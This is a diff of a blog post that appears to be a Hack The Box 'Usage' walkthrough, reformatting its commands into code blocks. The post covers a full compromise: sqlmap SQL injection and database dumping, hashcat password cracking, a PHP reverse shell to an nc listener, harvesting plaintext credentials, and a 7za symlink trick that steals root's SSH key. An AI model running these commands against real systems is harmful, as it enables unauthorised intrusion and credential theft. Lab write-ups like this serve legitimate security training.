@@ -14,7 +14,7 @@ Enumeration
 As usual for an easy box, I set up a basic scan of the IP
 
 {% highlight bash %}
-`nmap -sC -sV 10.10.11.18`
+nmap -sC -sV 10.10.11.18
 {% endhighlight%}
 
 ![nmap results](/assets/images/Usage/nmap%20results.png)
@@ -64,7 +64,9 @@ XSRF seems unlikely because there are tokens in place. I try some XSS checks as 
 
 Firing up Burpsuite, I sent the request to the repeater, and spent some time looking through the response without gaining any additional insight. After multiple attempts, I finally got this command put together: 
 
-`sqlmap -r burp.txt -p 'email' --level=5 --risk=3 v 7 --batch --dbs`
+{% highlight bash %} 
+sqlmap -r burp.txt -p 'email' --level=5 --risk=3 v 7 --batch --dbs
+{% endhighlight%}
 
 Which breaks down into the following:
 
@@ -90,9 +92,13 @@ And got 3 databases:
 
 I then ran the following to get the tables and dump the info of admin_users, adding in the DB type to make it run a little faster. 
 
-`sqlmap -r burp.txt -p 'email' --dbms=mysql --level=5 --risk=3 -v 7 --batch -D usage_blog --tables`
+{% highlight bash %} 
+sqlmap -r burp.txt -p 'email' --dbms=mysql --level=5 --risk=3 -v 7 --batch -D usage_blog --tables
+{% endhighlight%}
 
-`sqlmap -r burp.txt -p 'email' --dbms=mysql --level=5 --risk=3 -v 7 --batch -D usage_blog -T admin_users --dump`
+{% highlight bash %} 
+sqlmap -r burp.txt -p 'email' --dbms=mysql --level=5 --risk=3 -v 7 --batch -D usage_blog -T admin_users --dump
+{% endhighlight%}
 
 which yielded a nice hash for admin.
 
@@ -102,7 +108,9 @@ which yielded a nice hash for admin.
 
 I then used https://hashes.com/en/tools/hash_identifier to identify the hash as bcrypt, and dropped it into a text file with vim. Hashcat gets put into work next and quickly yields admin:whatever1. Good ol' rockyou!
 
-`hashcat -m 3200 -a 0 adminhash.txt /usr/share/wordlists/rockyou.txt.gz`
+{% highlight bash %}
+ hashcat -m 3200 -a 0 adminhash.txt /usr/share/wordlists/rockyou.txt.gz
+ {% endhighlight%}
 
 ![nmap results](/assets/images/Usage/hashcat%20output.png)
 
@@ -121,26 +129,33 @@ Once I got the process nailed down, I started trying php reverse shells from htt
 
 Which seemed to only be able to execute php commands, and I was not able to navigate any filesystem with. So I doubled down on the php revshells, set up a listener, and inserted another reverse shell command into my malicious web page. 
 
-`ifconfig `
+{% highlight bash %} 
+ifconfig 
+
 (grab listener address)
 
-`nc -nvlp 8001`
+nc -nvlp 8001
 
-`php -r '$sock=fsockopen("10.10.14.54",8001);exec("sh<&3>&3 2>&3");'`
+php -r '$sock=fsockopen("10.10.14.54",8001);exec("sh<&3>&3 2>&3");'
+{% endhighlight%}
 
 and I finally catch a shell! We can even get the user flag from here.
 
 ![nmap results](/assets/images/Usage/reverse%20shell.png)
 
-`cd ~ `
+{% highlight bash %} 
+cd ~ 
 
-`cat user.txt`
+cat user.txt
+{% endhighlight%}
 
 The box has python so we can upgrade our shell
 
-`python3 --version`
+{% highlight bash %} 
+python3 --version
 
-`python3 -c 'import pty;pty.spawn("/bin/bash")'`
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+{% endhighlight%}
 
 This was my least favorite part. I spent a decent amount of time looking around the box, trying to find something useful. I can see another user, "xander", but can't access their directory. I found plaintext database credentials in /var/www/html/project_admin/.env
 
@@ -148,29 +163,38 @@ This was my least favorite part. I spent a decent amount of time looking around 
 
 But this just gives access to the mysql db I was in earlier, and the password hasn't been reused for xander, root, or admin. My search was primarily through the /var/www/html, hoping to find some type of password reuse. It wasn't until (much later) that I returned to the home directory and looked for hidden files that I finally hit paydirt. It appears there is a monitoring utility that needs some plaintext passwords to run.
 
-`ls -al`
+{% highlight bash %}
+ ls -al
 
-`cat .monitrc`
+
+cat .monitrc
+{% endhighlight%}
 
 ![nmap results](/assets/images/Usage/monitrc%20pass.png)
 
 Luckily, this password is reused, and I can ssh to xander. 
 
-`ssh xander@10.10.11.18`
+{% highlight bash %} 
+ssh xander@10.10.11.18
+{% endhighlight%}
 
 ![nmap results](/assets/images/Usage/xander%20ssh%20access.png)
 
 And now I can start down my privilege escalation checklist. Almost immediately I find something interesting. 
 
-`sudo -l`
+{% highlight bash %} 
+sudo -l
+{% endhighlight%}
 
 ![nmap results](/assets/images/Usage/sudo%20-l.png)
 
 Given that the name of the box is "Usage", I'm gonna prioritize this binary. Diving right in, I see that it givecs three options - project backup, backup MySQL data, reset admin password.
 
-`cd /usr/bin`
+{% highlight bash %} 
+cd /usr/bin
 
-`sudo usage_management`
+sudo usage_management
+{% endhighlight%}
 
 
 3 looks like fun, so I start there, but I don't get to choose what it resets to, or get any insight into what it changes to. Since it's unlikely to reset the root password anyway, I keep it moving. 2 doesn't print out anything useful either, but 1 has some output as it runs. 
@@ -181,11 +205,14 @@ It looks from the output like it uses 7-zip to open /var/backups/project.zip and
 
 Finally, I get smart enough to run strings.
 
-`strings usage_management`
+{% highlight bash %} 
+strings usage_management
+{% endhighlight%}
 
 ![nmap results](/assets/images/Usage/strings.png)
 
 With strings, I can see a little better how 7za is being used. Specifically: 
+
 
 `/usr/bin/7za`: calls executable
 
@@ -211,21 +238,25 @@ From what I understand, if you have write permissions to the folder 7z targets (
 
 Now, I could grab root.txt directly, but I would rather go full escalation and grab the ssh key instead. 
 
-`cd /var/www/html`
+{% highlight bash %} 
+cd /var/www/html
 
-`touch @id_rsa`
+touch @id_rsa
 
-`ln -s /root/.ssh/id_rsa id_rsa`
+ln -s /root/.ssh/id_rsa id_rsa
 
-`sudo /usr/bin/usage_management`
+sudo /usr/bin/usage_management
+{% endhighlight%}
 
 ![nmap results](/assets/images/Usage/ssh%20key.png)
 
 Bingo! I just copy into a .pem file and format correctly, then change the permissions. 
 
-`chmod 600 sshkey.pem`
+{% highlight bash %}
+ chmod 600 sshkey.pem
 
-`ssh -i sshkey.pem root@10.10.11.18`
+ssh -i sshkey.pem root@10.10.11.18
+{% endhighlight%}
 
 and we have root!
 
